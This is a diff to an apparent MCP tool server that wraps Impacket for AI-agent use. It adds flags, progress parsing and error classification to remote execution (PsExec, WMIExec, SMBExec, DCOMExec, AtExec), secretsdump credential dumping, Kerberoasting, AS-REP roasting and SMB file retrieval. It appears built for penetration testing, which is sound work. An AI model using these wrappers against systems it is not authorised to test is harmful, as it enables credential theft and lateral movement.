+        # Traceback
+        if "Traceback" in text:
+            return ("unknown", True, [])
+        return ("unknown", False, [])
 
     def _parse_secretsdump_output(self, stdout: str, stderr: str, output_prefix: str) -> Dict[str, Any]:
         """Parse secretsdump output and any generated files."""
@@ -1117,8 +2644,10 @@ class ImpacketServer(BaseMCPServer):
         in_hash = False
 
         for line in combined.split("\n"):
-            # Detect user/SPN table rows
+            # Detect new hash line — flush any pending hash first
             if line.startswith("$krb5tgs$"):
+                if current_hash:
+                    hashes.append("".join(current_hash))
                 in_hash = True
                 current_hash = [line.strip()]
                 continue
@@ -1165,6 +2694,8 @@ class ImpacketServer(BaseMCPServer):
 
         for line in combined.split("\n"):
             if line.startswith("$krb5asrep$"):
+                if current_hash:
+                    hashes.append("".join(current_hash))
                 in_hash = True
                 current_hash = [line.strip()]
                 continue
@@ -1192,18 +2723,46 @@ class ImpacketServer(BaseMCPServer):
         }
 
     def _parse_smb_shares(self, stdout: str, stderr: str) -> List[Dict[str, str]]:
-        """Parse smbclient 'shares' command output."""
+        """Parse smbclient 'shares' command output.
+
+        impacket-smbclient outputs share names one per line, sometimes
+        preceded by '# ' prompt characters.  Format:
+            # ADMIN$
+            C$
+            IPC$
+        """
         shares = []
         combined = stdout + stderr
+
+        # If the output looks like usage/help text (e.g. wrong port caused
+        # impacket-smbclient to print its argparse help), return empty list
+        # to avoid misinterpreting usage words as share names.
+        if "usage:" in combined.lower() or "impacket-smbclient [-h]" in combined or "impacket-smbclient [" in combined:
+            return shares
+
         for line in combined.split("\n"):
-            # Match share listing lines like: "ADMIN$    DISK    Remote Admin"
-            match = re.match(r"^\s*(\S+)\s+(DISK|IPC|PRINT)\s+(.*)?$", line.strip())
+            stripped = line.strip().lstrip("# ").strip()
+            # Skip empty, banners, prompts, and help text
+            if not stripped or stripped.startswith("Impacket") or stripped.startswith("Type help") or stripped.startswith("["):
+                continue
+            # Tabular format: "ADMIN$    DISK    Remote Admin"
+            match = re.match(r"^(\S+)\s+(DISK|IPC|PRINT)\s*(.*)?$", stripped)
             if match:
                 shares.append({
                     "name": match.group(1),
                     "type": match.group(2),
                     "comment": (match.group(3) or "").strip(),
                 })
+                continue
+            # Simple format: just share name per line (from impacket-smbclient 'shares' command)
+            if stripped and not stripped.startswith("-") and "$" in stripped or stripped.isalnum() or stripped in ("NETLOGON", "SYSVOL", "Replication", "Users"):
+                # Heuristic: looks like a share name (alphanumeric, possibly ending in $)
+                if re.match(r"^[\w\$\-\.]+$", stripped) and len(stripped) < 50:
+                    shares.append({
+                        "name": stripped,
+                        "type": "unknown",
+                        "comment": "",
+                    })
         return shares
 
     def _parse_ad_users(self, stdout: str, stderr: str) -> List[Dict[str, str]]:
@@ -1251,7 +2810,7 @@ class ImpacketServer(BaseMCPServer):
                 continue
 
             # Parse entries like: "500: DOMAIN\Administrator (SidTypeUser)"
-            entry_match = re.match(r"^(\d+):\s+(\S+\\)?(\S+)\s+\((\w+)\)", line)
+            entry_match = re.match(r"^(\d+):\s+(\S+\\)?(.+?)\s+\((\w+)\)", line)
             if entry_match:
                 rid = entry_match.group(1)
                 domain_prefix = (entry_match.group(2) or "").rstrip("\\")
@@ -1292,32 +2851,71 @@ class ImpacketServer(BaseMCPServer):
         port: Optional[int] = None,
         command: Optional[str] = None,
         service_name: Optional[str] = None,
+        remote_binary_name: Optional[str] = None,
+        upload_file: Optional[str] = None,
         codec: str = "utf-8",
-        timeout: int = 120,
+        extra_args: Optional[str] = None,
+        timeout: int = 120,  # unused: client controls timeout via heartbeat cancellation
     ) -> ToolResult:
         """Execute commands via PsExec (SMB service creation)."""
         self.logger.info(f"PsExec to {target}")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-psexec"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         if service_name:
             cmd.extend(["-service-name", service_name])
+        if remote_binary_name:
+            cmd.extend(["-remote-binary-name", remote_binary_name])
+        if upload_file:
+            cmd.extend(["-c", upload_file])
         if codec != "utf-8":
             cmd.extend(["-codec", codec])
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
         if command:
             cmd.append(command)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             parsed = self._parse_exec_output(result.stdout, result.stderr)
+            combined = result.stdout + result.stderr
 
-            success = result.returncode == 0 or bool(parsed["output"].strip())
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or bool(parsed["output"].strip())) and not has_error
+
+            # PsExec-specific: if every share was "not writable" and there is
+            # no real command output (only [-] warning lines), the user lacks
+            # admin privileges.  parsed["output"] may contain the [-] lines
+            # because _parse_exec_output only strips [*] and [!].
+            if success and "is not writable" in combined:
+                # Strip [-] lines from output to see if any *real* output remains
+                real_output = "\n".join(
+                    l for l in parsed["output"].split("\n")
+                    if not l.strip().startswith("[-]")
+                ).strip()
+                if not real_output:
+                    success = False
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                # Provide a specific error message and class for the "no writable share" case
+                if "is not writable" in combined and not error_class:
+                    error_class = "permission"
+                    suggestions = [
+                        "No writable share found — user lacks admin privileges for PsExec",
+                        "Try wmiexec or smbexec as alternatives, or use an admin account",
+                    ]
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "PsExec failed"
+
             return ToolResult(
                 success=success,
                 data={
@@ -1326,10 +2924,18 @@ class ImpacketServer(BaseMCPServer):
                     "command": command,
                     **parsed,
                 },
-                raw_output=sanitize_output(result.stdout + result.stderr),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target}, error=str(e),
+                error_class=error_class, retryable=retryable, suggestions=suggestions,
+            )
 
     async def wmiexec(
         self,
@@ -1344,32 +2950,54 @@ class ImpacketServer(BaseMCPServer):
         port: Optional[int] = None,
         command: Optional[str] = None,
         nooutput: bool = False,
+        shell_type: Optional[str] = None,
+        silentcommand: bool = False,
+        share: Optional[str] = None,
         codec: str = "utf-8",
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Execute commands via WMI (stealthier, no service creation)."""
         self.logger.info(f"WMIExec to {target}")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-wmiexec"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         if nooutput:
             cmd.append("-nooutput")
+        if silentcommand:
+            cmd.append("-silentcommand")
+        if shell_type:
+            cmd.extend(["-shell-type", shell_type])
+        if share:
+            cmd.extend(["-share", share])
         if codec != "utf-8":
             cmd.extend(["-codec", codec])
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
         if command:
             cmd.append(command)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             parsed = self._parse_exec_output(result.stdout, result.stderr)
+            combined = result.stdout + result.stderr
 
-            success = result.returncode == 0 or bool(parsed["output"].strip())
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or bool(parsed["output"].strip())) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "WMIExec failed"
+
             return ToolResult(
                 success=success,
                 data={
@@ -1378,10 +3006,18 @@ class ImpacketServer(BaseMCPServer):
                     "command": command,
                     **parsed,
                 },
-                raw_output=sanitize_output(result.stdout + result.stderr),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target}, error=str(e),
+                error_class=error_class, retryable=retryable, suggestions=suggestions,
+            )
 
     async def smbexec(
         self,
@@ -1398,21 +3034,23 @@ class ImpacketServer(BaseMCPServer):
         share: str = "C$",
         mode: str = "SHARE",
         codec: str = "utf-8",
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Execute commands via SMB (native commands, no binary upload)."""
         self.logger.info(f"SMBExec to {target}")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-smbexec"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         cmd.extend(["-share", share])
         cmd.extend(["-mode", mode])
         if codec != "utf-8":
             cmd.extend(["-codec", codec])
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
 
         # smbexec is interactive (no command positional arg). Pipe command to stdin.
@@ -1436,8 +3074,19 @@ class ImpacketServer(BaseMCPServer):
             stdout_str = stdout.decode("utf-8", errors="replace")
             stderr_str = stderr.decode("utf-8", errors="replace")
             parsed = self._parse_exec_output(stdout_str, stderr_str)
+            combined = stdout_str + stderr_str
 
-            success = proc.returncode == 0 or bool(parsed["output"].strip())
+            has_error = self._has_error_in_output(combined)
+            success = (proc.returncode == 0 or bool(parsed["output"].strip())) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SMBExec failed"
+
             return ToolResult(
                 success=success,
                 data={
@@ -1446,7 +3095,11 @@ class ImpacketServer(BaseMCPServer):
                     "command": command,
                     **parsed,
                 },
-                raw_output=sanitize_output(stdout_str + stderr_str),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except asyncio.TimeoutError:
             proc.kill()
@@ -1455,7 +3108,11 @@ class ImpacketServer(BaseMCPServer):
         except ToolError:
             raise
         except Exception as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target}, error=str(e),
+                error_class=error_class, retryable=retryable, suggestions=suggestions,
+            )
 
     async def dcomexec(
         self,
@@ -1471,33 +3128,49 @@ class ImpacketServer(BaseMCPServer):
         command: Optional[str] = None,
         dcom_object: str = "MMC20",
         nooutput: bool = False,
+        silentcommand: bool = False,
         codec: str = "utf-8",
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Execute commands via DCOM objects."""
         self.logger.info(f"DCOMExec to {target} using {dcom_object}")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-dcomexec"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         cmd.extend(["-object", dcom_object])
         if nooutput:
             cmd.append("-nooutput")
+        if silentcommand:
+            cmd.append("-silentcommand")
         if codec != "utf-8":
             cmd.extend(["-codec", codec])
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
         if command:
             cmd.append(command)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             parsed = self._parse_exec_output(result.stdout, result.stderr)
 
-            success = result.returncode == 0 or bool(parsed["output"].strip())
+            combined = result.stdout + result.stderr
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or bool(parsed["output"].strip())) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "DCOMExec failed"
+
             return ToolResult(
                 success=success,
                 data={
@@ -1507,10 +3180,18 @@ class ImpacketServer(BaseMCPServer):
                     "object": dcom_object,
                     **parsed,
                 },
-                raw_output=sanitize_output(result.stdout + result.stderr),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target}, error=str(e),
+                error_class=error_class, retryable=retryable, suggestions=suggestions,
+            )
 
     async def atexec(
         self,
@@ -1525,28 +3206,41 @@ class ImpacketServer(BaseMCPServer):
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
         codec: str = "utf-8",
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Execute commands via Task Scheduler."""
         self.logger.info(f"AtExec to {target}: {command}")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-atexec"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         if codec != "utf-8":
             cmd.extend(["-codec", codec])
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
         cmd.append(command)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             parsed = self._parse_exec_output(result.stdout, result.stderr)
 
-            success = result.returncode == 0 or bool(parsed["output"].strip())
+            combined = result.stdout + result.stderr
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or bool(parsed["output"].strip())) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "AtExec failed"
+
             return ToolResult(
                 success=success,
                 data={
@@ -1555,10 +3249,18 @@ class ImpacketServer(BaseMCPServer):
                     "command": command,
                     **parsed,
                 },
-                raw_output=sanitize_output(result.stdout + result.stderr),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target}, error=str(e),
+                error_class=error_class, retryable=retryable, suggestions=suggestions,
+            )
 
     # ── Credential Attack Methods ────────────────────────────────────────
 
@@ -1578,12 +3280,19 @@ class ImpacketServer(BaseMCPServer):
         just_dc_user: Optional[str] = None,
         use_vss: bool = False,
         exec_method: Optional[str] = None,
+        history: bool = False,
+        pwd_last_set: bool = False,
+        user_status: bool = False,
+        skip_sam: bool = False,
+        use_keylist: bool = False,
+        ldapfilter: Optional[str] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 600,
     ) -> ToolResult:
         """Dump credentials from a Windows host (SAM/LSA/NTDS.dit)."""
         self.logger.info(f"Secretsdump against {target}")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
@@ -1592,7 +3301,7 @@ class ImpacketServer(BaseMCPServer):
         output_prefix = os.path.join(tmpdir, "secretsdump")
 
         cmd = ["impacket-secretsdump"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         cmd.extend(["-outputfile", output_prefix])
 
         if just_dc:
@@ -1605,25 +3314,74 @@ class ImpacketServer(BaseMCPServer):
             cmd.append("-use-vss")
         if exec_method:
             cmd.extend(["-exec-method", exec_method])
+        if history:
+            cmd.append("-history")
+        if pwd_last_set:
+            cmd.append("-pwd-last-set")
+        if user_status:
+            cmd.append("-user-status")
+        if skip_sam:
+            cmd.append("-skip-sam")
+        if use_keylist:
+            cmd.append("-use-keylist")
+        if ldapfilter:
+            cmd.extend(["-ldapfilter", ldapfilter])
 
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
+
+        def _secretsdump_progress(line: str) -> Optional[str]:
+            """Extract meaningful progress from secretsdump output."""
+            if "[*] Dumping local SAM" in line:
+                return "Dumping SAM hashes..."
+            if "[*] Dumping LSA" in line:
+                return "Dumping LSA secrets..."
+            if "[*] Dumping cached" in line:
+                return "Dumping cached credentials..."
+            if "[*] Dumping Domain" in line or "[*] Using the DRSUAPI" in line:
+                return "Dumping NTDS.dit via DRSUAPI..."
+            if "[*] Kerberos keys" in line:
+                return "Extracting Kerberos keys..."
+            return None
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(
+                cmd, env=auth_env,
+                progress_filter=_secretsdump_progress,
+            )
             parsed = self._parse_secretsdump_output(result.stdout, result.stderr, output_prefix)
+            combined = result.stdout + result.stderr
 
-            success = result.returncode == 0 or parsed["total_hashes"] > 0
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or parsed["total_hashes"] > 0) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Secretsdump failed"
+
             return ToolResult(
                 success=success,
                 data={
                     "target": target,
                     **parsed,
                 },
-                raw_output=sanitize_output(result.stdout + result.stderr),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target}, error=str(e),
+                error_class=error_class, retryable=retryable, suggestions=suggestions,
+            )
         finally:
             # Clean up output files and temp directory
             for suffix in [".sam", ".secrets", ".cached", ".ntds", ".ntds.kerberos", ".ntds.cleartext"]:
@@ -1651,33 +3409,75 @@ class ImpacketServer(BaseMCPServer):
         port: Optional[int] = None,
         request_user: Optional[str] = None,
         output_format: str = "hashcat",
+        target_domain: Optional[str] = None,
+        stealth: bool = False,
+        no_preauth: Optional[str] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Kerberoasting - extract TGS service ticket hashes."""
         self.logger.info(f"Kerberoasting against {target}")
 
-        identity_str, extra_args = self._build_domain_auth_args(
+        identity_str, auth_extra = self._build_domain_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-GetUserSPNs"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         cmd.append("-request")
 
+        john_output_file = None
         if request_user:
             cmd.extend(["-request-user", request_user])
         if output_format == "john":
-            cmd.append("-outputfile")
-            cmd.append("/tmp/kerberoast_john.txt")
+            john_output_file = "/tmp/kerberoast_john.txt"
+            cmd.extend(["-outputfile", john_output_file])
+        if target_domain:
+            cmd.extend(["-target-domain", target_domain])
+        if stealth:
+            cmd.append("-stealth")
+        if no_preauth:
+            cmd.extend(["-no-preauth", no_preauth])
 
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(identity_str)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(
+                cmd, env=auth_env,
+            )
             parsed = self._parse_kerberoast_output(result.stdout, result.stderr)
+            combined = result.stdout + result.stderr
 
-            success = result.returncode == 0 or parsed["hash_count"] > 0
+            # Bug 5 fix: john format writes hashes to file instead of stdout.
+            # Read the output file and merge into parsed hashes.
+            if john_output_file and os.path.exists(john_output_file):
+                try:
+                    with open(john_output_file, "r") as f:
+                        file_hashes = [line.strip() for line in f if line.strip()]
+                    if file_hashes and not parsed["hashes"]:
+                        parsed["hashes"] = file_hashes
+                        parsed["hash_count"] = len(file_hashes)
+                except Exception:
+                    pass
+                finally:
+                    try:
+                        os.unlink(john_output_file)
+                    except OSError:
+                        pass
+
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or parsed["hash_count"] > 0) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Kerberoast failed"
+
             return ToolResult(
                 success=success,
                 data={
@@ -1685,10 +3485,18 @@ class ImpacketServer(BaseMCPServer):
                     "format": output_format,
                     **parsed,
                 },
-                raw_output=sanitize_output(result.stdout + result.stderr),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target}, error=str(e),
+                error_class=error_class, retryable=retryable, suggestions=suggestions,
+            )
 
     async def asreproast(
         self,
@@ -1703,17 +3511,18 @@ class ImpacketServer(BaseMCPServer):
         port: Optional[int] = None,
         usersfile: Optional[str] = None,
         output_format: str = "hashcat",
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """AS-REP Roasting - extract hashes for accounts without pre-auth."""
         self.logger.info(f"AS-REP Roasting against {target}")
 
-        identity_str, extra_args = self._build_domain_auth_args(
+        identity_str, auth_extra = self._build_domain_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-GetNPUsers"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         cmd.append("-request")
 
         if usersfile:
@@ -1723,14 +3532,26 @@ class ImpacketServer(BaseMCPServer):
         else:
             cmd.extend(["-format", "hashcat"])
 
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(identity_str)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             parsed = self._parse_asreproast_output(result.stdout, result.stderr)
+            combined = result.stdout + result.stderr
 
-            success = result.returncode == 0 or parsed["hash_count"] > 0
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or parsed["hash_count"] > 0) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "AS-REP roast failed"
+
             return ToolResult(
                 success=success,
                 data={
@@ -1738,10 +3559,18 @@ class ImpacketServer(BaseMCPServer):
                     "format": output_format,
                     **parsed,
                 },
-                raw_output=sanitize_output(result.stdout + result.stderr),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target}, error=str(e),
+                error_class=error_class, retryable=retryable, suggestions=suggestions,
+            )
 
     # ── SMB Operation Methods ────────────────────────────────────────────
 
@@ -1756,18 +3585,20 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 60,
     ) -> ToolResult:
         """List SMB shares on a remote host."""
         self.logger.info(f"Listing SMB shares on {target}")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         # Use smbclient with piped stdin commands
         cmd = ["impacket-smbclient"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
 
         auth_env = self._get_auth_env() if kerberos else {}
@@ -1789,16 +3620,50 @@ class ImpacketServer(BaseMCPServer):
             stdout_str = stdout.decode("utf-8", errors="replace")
             stderr_str = stderr.decode("utf-8", errors="replace")
 
-            shares = self._parse_smb_shares(stdout_str, stderr_str)
+            combined = stdout_str + stderr_str
+
+            # Detect connection-level failures before attempting to parse shares.
+            # When connection fails (wrong port, host unreachable, refused, etc.),
+            # impacket may dump usage text or error banners that the parser could
+            # misinterpret as share names.
+            _conn_error_patterns = [
+                "Connection refused", "timed out", "No route to host",
+                "Network is unreachable", "Connection reset",
+                "Could not connect", "Name or service not known",
+            ]
+            conn_failed = any(p in combined for p in _conn_error_patterns)
+            # Also treat usage/help text as a connection failure (wrong args
+            # or port causes smbclient to never connect).
+            conn_failed = conn_failed or "usage:" in combined.lower() or "impacket-smbclient [-h]" in combined
+
+            if conn_failed:
+                shares = []
+            else:
+                shares = self._parse_smb_shares(stdout_str, stderr_str)
+
+            # Check for errors even when process exits 0
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            success = True
+            if conn_failed or (not shares and ("SessionError" in combined or "STATUS_" in combined or "KDC_ERR" in combined)):
+                success = False
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SMB share listing failed"
 
             return ToolResult(
-                success=True,
+                success=success,
                 data={
                     "target": target,
                     "shares": shares,
                     "share_count": len(shares),
                 },
-                raw_output=sanitize_output(stdout_str + stderr_str),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except asyncio.TimeoutError:
             proc.kill()
@@ -1807,7 +3672,9 @@ class ImpacketServer(BaseMCPServer):
         except ToolError:
             raise
         except Exception as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            ec, rt, sg = self._classify_error(str(e))
+            return ToolResult(success=False, data={"target": target}, error=str(e),
+                              error_class=ec, retryable=rt, suggestions=sg)
 
     async def smb_get(
         self,
@@ -1822,12 +3689,13 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Download a file from an SMB share."""
         self.logger.info(f"Downloading {share}/{remote_path} from {target}")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
@@ -1836,11 +3704,23 @@ class ImpacketServer(BaseMCPServer):
         os.close(fd)
 
         cmd = ["impacket-smbclient"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
 
-        # Normalize path separators for smbclient
+        # Normalize path: impacket-smbclient get takes ONE arg (remote filename).
+        # It saves to local CWD with basename. We cd to remote dir, get basename,
+        # then move from CWD to our target local_path.
         smb_path = remote_path.replace("/", "\\")
+        if not smb_path.startswith("\\"):
+            smb_path = "\\" + smb_path
+
+        # Split into directory and filename
+        smb_dir = ntpath.dirname(smb_path)
+        smb_file = ntpath.basename(smb_path)
+
+        # Create a temp directory to download into (smbclient saves to CWD)
+        download_dir = tempfile.mkdtemp(prefix="smb_dl_")
 
         auth_env = self._get_auth_env() if kerberos else {}
         merged_env = {**os.environ, **auth_env} if auth_env else None
@@ -1851,9 +3731,12 @@ class ImpacketServer(BaseMCPServer):
                 stdin=asyncio.subprocess.PIPE,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
+                cwd=download_dir,  # smbclient saves to CWD
             )
 
-            commands = f"use {share}\nget {smb_path} {local_path}\nexit\n"
+            # cd to remote directory, then get just the filename
+            cd_cmd = f"cd {smb_dir}\n" if smb_dir else ""
+            commands = f"use {share}\n{cd_cmd}get {smb_file}\nexit\n"
             stdout, stderr = await asyncio.wait_for(
                 proc.communicate(input=commands.encode()),
                 timeout=timeout,
@@ -1862,8 +3745,15 @@ class ImpacketServer(BaseMCPServer):
             stdout_str = stdout.decode("utf-8", errors="replace")
             stderr_str = stderr.decode("utf-8", errors="replace")
 
-            # Check if file was downloaded
-            if os.path.exists(local_path) and os.path.getsize(local_path) > 0:
+            combined = stdout_str + stderr_str
+
+            # Check if file was downloaded to the download dir
+            downloaded_file = os.path.join(download_dir, smb_file)
+            has_error = self._has_error_in_output(combined)
+            # Move downloaded file to our target local_path
+            if os.path.exists(downloaded_file) and os.path.getsize(downloaded_file) > 0:
+                shutil.move(downloaded_file, local_path)
+            if os.path.exists(local_path) and os.path.getsize(local_path) > 0 and not has_error:
                 with open(local_path, "rb") as f:
                     raw = f.read()
                 try:
@@ -1885,11 +3775,25 @@ class ImpacketServer(BaseMCPServer):
                     raw_output=content,
                 )
             else:
+                # Classify the error for proper error_class
+                error_class, retryable, suggestions = self._classify_error(combined)
+                # Additional pattern matching for common SMB download errors
+                if error_class == "unknown":
+                    if "STATUS_ACCESS_DENIED" in combined:
+                        error_class = "permission"
+                    elif "STATUS_BAD_NETWORK_NAME" in combined:
+                        error_class = "params"
+                    elif "timed out" in combined.lower() or "Timeout" in combined:
+                        error_class = "timeout"
+                        retryable = True
